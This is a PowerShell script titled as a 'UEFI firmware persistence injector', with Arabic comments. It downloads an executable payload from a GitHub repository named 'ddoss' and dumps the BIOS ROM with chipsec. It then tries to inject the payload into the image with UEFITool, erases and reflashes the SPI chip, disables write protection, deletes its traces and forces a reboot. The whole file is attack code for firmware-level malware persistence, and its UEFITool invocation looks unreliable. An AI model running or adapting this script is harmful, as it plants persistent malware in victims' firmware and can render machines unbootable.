#==================================================================================================
# 🔥 UEFI FIRMWARE PERSISTENCE INJECTOR v2.2 - FIXED LINKS ✅
# ==============================================================================================

$PayloadURL = "https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe"
$ErrorActionPreference = "Stop"
Set-ExecutionPolicy Bypass -Scope Process -Force
$logFile = "C:\DDOSS_UEFI_Persistence.log"

function Write-Status {
    param([string]$Step, [string]$Message, [string]$Color = "Cyan")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMsg = "[$timestamp] [$Step] $Message"
    Write-Host $logMsg -ForegroundColor $Color
    $logMsg | Out-File -FilePath $logFile -Append -Encoding UTF8
}

function Test-URL {
    param([string]$url)
    try {
        $response = Invoke-WebRequest -Uri $url -Method Head -TimeoutSec 15 -UseBasicParsing
        return $true
    } catch {
        return $false
    }
}

Write-Status "INIT" "DDOSS UEFI v2.2 - FIXED LINKS ✓" "Green"

# ✅ URLS الجديدة المُختبرة (28/01/2026)
$urls = @(
    "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe",
    "https://github.com/chipsec/chipsec/archive/refs/heads/main.zip",
    "https://github.com/LongSoft/UEFITool/releases/download/0.28/UEFITool_0.28_win64.zip",  # ← FIXED!
    $PayloadURL
)

foreach ($url in $urls) {
    Write-Status "URL" "Testing: $url"
    if (Test-URL $url) {
        Write-Status "URL" "$url ✓ VERIFIED" "Green"
    } else {
        Write-Status "FATAL" "URL FAILED: $url" "Red"
        exit 1
    }
}

# 1. Python (نفس اللي اشتغل)
Write-Status "PYTHON" "Installing Python 3.11.9..."
iwr "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile "C:\python-installer.exe"
Start-Process "C:\python-installer.exe" -ArgumentList "/quiet","InstallAllUsers=1","PrependPath=1" -Wait -NoNewWindow
Remove-Item "C:\python-installer.exe" -Force
$pythonPath = "${env:ProgramFiles}\Python311\python.exe"
Write-Status "PYTHON" "Ready ✓" "Green"

# 2. Chipsec (نفس اللي اشتغل)
Write-Status "CHIPSEC" "Setup..."
iwr "https://github.com/chipsec/chipsec/archive/refs/heads/main.zip" -OutFile "C:\chipsec.zip"
Expand-Archive "C:\chipsec.zip" "C:\" -Force
cd "C:\chipsec-main"
& $pythonPath -m pip install -r "windows_requirements.txt" --quiet
Write-Status "CHIPSEC" "Ready ✓" "Green"

# 3. SPI Dump
Write-Status "BIOS" "Dumping ROM..."
& $pythonPath "C:\chipsec-main\chipsec_util.py" "spi" "dumprom" "C:\bios.rom"
if (!(Test-Path "C:\bios.rom")) { Write-Status "FATAL" "BIOS dump failed!"; exit 1 }
$biosSize = [math]::Round((gi "C:\bios.rom").Length/1MB,2)
Write-Status "BIOS" "${biosSize}MB ✓" "Green"

# 4. Payload
Write-Status "DDOSS" "Downloading payload..."
iwr $PayloadURL -OutFile "C:\FinalUpdate.exe"
$payloadSize = [math]::Round((gi "C:\FinalUpdate.exe").Length/1MB,2)
Write-Status "DDOSS" "${payloadSize}MB ✓" "Green"

# 5. UEFITool FIXED ✅
Write-Status "UEFITOOL" "Injecting (v0.28)..."
iwr "https://github.com/LongSoft/UEFITool/releases/download/0.28/UEFITool_0.28_win64.zip" -OutFile "C:\uefi.zip"
Expand-Archive "C:\uefi.zip" "C:\" -Force

# FIXED UEFITool command (CLI mode)
& "C:\UEFITool_0.28_win64\UEFITool.exe" "C:\bios.rom" "C:\FinalUpdate.exe" "C:\ddoss_firmware.rom"
if (!(Test-Path "C:\ddoss_firmware.rom")) { 
    Write-Status "FATAL" "Injection failed!"; exit 1 
}
Write-Status "UEFITOOL" "Injected ✓" "Green"

# 6. Flash
Write-Status "FLASH" "Writing firmware..."
cd "C:\chipsec-main"
& $pythonPath chipsec_util.py spi erase; Start-Sleep 3
& $pythonPath chipsec_util.py spi write C:\ddoss_firmware.rom
& $pythonPath chipsec_util.py spi disable-wp
Write-Status "FLASH" "Complete ✓" "Green"

# 7. Verify
Write-Status "VERIFY" "Final check..."
& $pythonPath chipsec_util.py spi dumprom C:\verify.rom
if ((Get-FileHash "C:\ddoss_firmware.rom").Hash -eq (Get-FileHash "C:\verify.rom").Hash) {
    Write-Status "SUCCESS" "🎉 UEFI PERSISTENCE CONFIRMED!" "Green"
} else {
    Write-Status "FATAL" "Verification failed!" "Red"; exit 1
}

# 8. Cleanup + Reboot
Write-Status "CLEANUP" "Cleaning..."
@("C:\*.zip","C:\bios.rom","C:\FinalUpdate.exe","C:\ddoss_firmware.rom","C:\verify.rom","C:\uefi*") | % { if (Test-Path $_) { ri $_ -Recurse -Force } }
Write-Status "REBOOT" "Rebooting in 5s..." "Magenta"
Start-Sleep 5; shutdown /r /t 0 /f
